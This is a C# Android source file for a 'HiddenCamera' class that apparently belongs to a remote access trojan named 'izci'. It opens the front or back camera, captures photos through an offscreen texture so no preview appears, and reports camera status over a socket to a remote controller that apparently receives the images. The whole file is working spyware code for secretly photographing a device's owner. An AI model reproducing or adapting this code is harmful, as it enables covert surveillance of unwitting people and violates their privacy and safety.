using Android.Hardware;
using Android.Hardware.Camera2;
using Android.OS;
using Android.Util;
using Android.Views;
using Java.IO;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace izci
{
    public partial class HiddenCamera
    {
        Camera _camera;
        CameraInfo _cameraInfo;
        RingList<int> _ringList;
        CameraFacing _currentCameraFacing;

        public HiddenCamera(CameraManager cameraManager)
        {
            _cameraInfo = new CameraInfo(cameraManager);
            int[] cameraIDs = _cameraInfo.GetCameraIdArray();
            _ringList = new RingList<int>(cameraIDs);
        }

        public void TakePhoto()
        {
            Release();
            int currentCameraID = SwitchCamera();
            if (currentCameraID != 5)
            {
                SetParametersAndTakePhoto(currentCameraID);
            }
            else
            {
                PictureCallback.Send(MainActivity.Soketimiz, Encoding.UTF8.GetBytes("CAMNOT|"), 0,
                 Encoding.UTF8.GetBytes("CAMNOT|").Length, 59999);
            }
        }

        private void Release()
        {
            try
            {
                if (_camera != null)
                {
                    _camera.StopPreview();
                    _camera.Release();
                }
            }
            catch (Java.Lang.RuntimeException) {
                //PictureCallback.Send(MainActivity.Soketimiz, Encoding.UTF8.GetBytes("CAMNOT|"), 0,
                 // Encoding.UTF8.GetBytes("CAMNOT|").Length, 59999);
            }
        }

        private int SwitchCamera()
        {
            try
            {
                int cameraId = int.Parse(MainValues.front_back);//NextCameraId();
                _camera = Camera.Open(cameraId);
                _currentCameraFacing = _cameraInfo.GetCameraFacing(cameraId);
            
            return cameraId;
            }
            catch (Exception) { return 5; }
        }

        private void SetParametersAndTakePhoto(int currentCameraId)
        {
            try
            {
                Camera.Parameters parameters = _camera.GetParameters();
                ModifyParameters(parameters);

                var modes = parameters.SupportedFlashModes;
                try
                {
                    if (modes.Count > 0)
                    {
                        parameters.FlashMode = modes[0];
                        parameters.FlashMode = FlashMode.Torch.ToString();
                    }
                }
                catch (Exception) { }
                _camera.SetPreviewTexture(new Android.Graphics.SurfaceTexture(10));
                _camera.SetParameters(parameters);
                _camera.StartPreview();
                _camera.TakePicture(null, null, new PictureCallback(currentCameraId));
            }
            catch (Java.Lang.RuntimeException)
            {
                Stop();
               // byte[] cam_kullaniliyor = Encoding.UTF8.GetBytes("CAMNOT|");
               // PictureCallback.Send(MainActivity.Soketimiz, cam_kullaniliyor, 0, cam_kullaniliyor.Length, 59999);
            }
        }

        public void Stop()
        {
            Release();
            _camera = null;
        }

        partial void ModifyParameters(Camera.Parameters oldParameters);

        private int NextCameraId()
            => _ringList.Next();
    }
}